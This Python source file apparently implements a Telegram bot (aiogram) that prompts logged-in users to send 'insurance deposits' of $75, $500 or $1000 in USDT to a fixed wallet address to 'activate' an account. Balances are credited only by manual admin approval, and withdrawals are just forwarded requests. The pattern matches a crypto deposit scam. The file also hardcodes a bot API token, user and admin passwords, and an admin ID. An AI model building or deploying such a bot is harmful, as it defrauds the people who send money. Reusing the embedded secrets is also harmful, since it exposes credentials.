import logging

from aiogram import Bot, Dispatcher, executor, types

from aiogram.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton



# ====================== ВСТАВЛЕННЫЙ ТОКЕН ======================

API_TOKEN = "8216116135:AAEsqunknYT3cSl2EM_EvTYBbhjZJOWfhOw"

# ================================================================



logging.basicConfig(level=logging.INFO)



bot = Bot(token=API_TOKEN)

dp = Dispatcher(bot)



# ===== AUTH DATA =====

USER_LOGIN = "pronto"

USER_PASSWORD = "ZeMDZxwv"



ADMIN_LOGIN = "SuperAdm1nX"

ADMIN_PASSWORD = "7vZ#9qLp!2T"



ADMIN_ID = 7625893405  # 



# ===== STORAGE =====

users = {}  # user_id: {"working_balance": int, "insurance_balance": int}

pending = []  # pending deposits

auth_stage = {}  # user_id: stage



# ===== KEYBOARDS =====

def main_kb():

    kb = ReplyKeyboardMarkup(resize_keyboard=True)

    kb.add("📊 Balance")

    kb.add("🟢 $75 [Circle]", "🌾 $500 [Agro Farm]", "🏭 $1000 [Farm]")

    return kb



def deposit_kb():

    kb = ReplyKeyboardMarkup(resize_keyboard=True)

    kb.add("🔄 Check Payment Status")

    return kb



def balance_kb():

    kb = ReplyKeyboardMarkup(resize_keyboard=True)

    kb.add("➕ Deposit", "➖ Withdraw")

    return kb



def admin_kb():

    kb = ReplyKeyboardMarkup(resize_keyboard=True)

    kb.add("📋 Pending Deposits")

    kb.add("📬 User Requests")

    return kb



# ===== START =====

@dp.message_handler(commands=["start"])

async def start(message: types.Message):

    auth_stage[message.from_user.id] = "login"

    await message.answer("🔐 Enter login:")



# ===== AUTH =====

@dp.message_handler()

async def auth(message: types.Message):

    uid = message.from_user.id

    text = message.text



    if uid not in auth_stage:

        return



    stage = auth_stage[uid]



    if stage == "login":

        if text == USER_LOGIN:

            auth_stage[uid] = "password_user"

            await message.answer("🔑 Enter password:")

        elif text == ADMIN_LOGIN:

            auth_stage[uid] = "password_admin"

            await message.answer("🔑 Enter admin password:")

        else:

            await message.answer("❌ Wrong login")



    elif stage == "password_user":

        if text == USER_PASSWORD:

            users.setdefault(uid, {"working_balance": 0, "insurance_balance": 0})

            auth_stage.pop(uid)

            await message.answer("✅ Logged in", reply_markup=main_kb())

        else:

            await message.answer("❌ Wrong password")



    elif stage == "password_admin":

        if text == ADMIN_PASSWORD and uid == ADMIN_ID:

            auth_stage.pop(uid)

            await message.answer("🛡 Admin panel", reply_markup=admin_kb())

        else:

            await message.answer("❌ Access denied")



# ===== USER BUTTONS =====

def deposit_text(amount):

    return (

        f"💎 To activate your account, please deposit an insurance deposit of **${amount}**.\n\n"

        f"💰 **USDT (BEP20)** deposit address:\n"

        f"`0xf3a329bf7e26fc7d2fd69762b2336805f378d07a`\n\n"

        f"📌 After sending payment, press the button below to check your payment status.\n"

        f"🔥 Make sure to send the correct amount to activate your account! 🎯"

    )



@dp.message_handler(lambda m: m.text in ["🟢 $75 [Circle]", "🌾 $500 [Agro Farm]", "🏭 $1000 [Farm]"])

async def deposit_menu(message: types.Message):

    uid = message.from_user.id

    amount = 0

    if message.text == "🟢 $75 [Circle]":

        amount = 75

    elif message.text == "🌾 $500 [Agro Farm]":

        amount = 500

    elif message.text == "🏭 $1000 [Farm]":

        amount = 1000



    # добавляем в pending

    pending.append({"user_id": uid, "amount": amount})



    await message.answer(

        deposit_text(amount),

        reply_markup=deposit_kb(),

        parse_mode="Markdown"

    )



@dp.message_handler(text="🔄 Check Payment Status")

async def check_payment(message: types.Message):

    uid = message.from_user.id

    found = False

    for dep in pending:

        if dep["user_id"] == uid:

            found = True

            await message.answer(f"⏳ Payment of ${dep['amount']} is still pending. Please wait for admin confirmation 💎")

            return

    await message.answer("✅ No pending deposits found. Your account is active! 🎉")



@dp.message_handler(text="📊 Balance")

async def show_balance(message: types.Message):

    uid = message.from_user.id

    users.setdefault(uid, {"working_balance": 0, "insurance_balance": 0})

    w_bal = users[uid]["working_balance"]

    i_bal = users[uid]["insurance_balance"]

    text = (

        f"💰 Your balances:\n"

        f"🛠 Working deposit: ${w_bal}\n"

        f"🛡 Insurance deposit: ${i_bal}\n\n"

        f"Choose an action below:"

    )

    await message.answer(text, reply_markup=balance_kb())



@dp.message_handler(lambda m: m.text in ["➕ Deposit", "➖ Withdraw"])

async def deposit_withdraw_request(message: types.Message):

    uid = message.from_user.id

    action = message.text

    await bot.send_message(ADMIN_ID, f"📣 User {uid} requested: {action}")

    await message.answer(f"📨 Your request '{action}' has been sent to admin. Please wait for confirmation!")



# ===== ADMIN =====

@dp.message_handler(text="📋 Pending Deposits")

async def admin_pending(message: types.Message):

    if message.from_user.id != ADMIN_ID:

        return



    if not pending:

        await message.answer("📭 No pending deposits")

        return



    for dep in pending:

        text = f"👤 User ID: {dep['user_id']}\n💰 Amount: ${dep['amount']}"

        kb = InlineKeyboardMarkup()

        kb.add(

            InlineKeyboardButton("✅ Received", callback_data=f"ok_{dep['user_id']}_{dep['amount']}"),

            InlineKeyboardButton("❌ Not received", callback_data=f"no_{dep['user_id']}_{dep['amount']}")

        )

        await message.answer(text, reply_markup=kb)



@dp.message_handler(text="📬 User Requests")

async def admin_requests(message: types.Message):

    await message.answer("📨 All user deposit/withdraw requests are sent directly via notifications.")



@dp.callback_query_handler(lambda c: c.data.startswith("ok_"))

async def confirm(callback: types.CallbackQuery):

    _, uid, amount = callback.data.split("_")

    uid = int(uid)

    amount = int(amount)



    users.setdefault(uid, {"working_balance": 0, "insurance_balance": 0})

    users[uid]["insurance_balance"] += amount



    pending[:] = [p for p in pending if not (p["user_id"] == uid and p["amount"] == amount)]



    await bot.send_message(uid, f"✅ Deposit ${amount} received. Your account is now active! 🎉")

    await callback.answer("Confirmed")



@dp.callback_query_handler(lambda c: c.data.startswith("no_"))

async def reject(callback: types.CallbackQuery):

    _, uid, amount = callback.data.split("_")

    uid = int(uid)

    amount = int(amount)



    pending[:] = [p for p in pending if not (p["user_id"] == uid and p["amount"] == amount)]



    await bot.send_message(uid, f"❌ Deposit ${amount} not received. Please try again! ⚠️")

    await callback.answer("Rejected")



# ===== RUN =====

if __name__ == "__main__":

    executor.start_polling(dp, skip_updates=True)

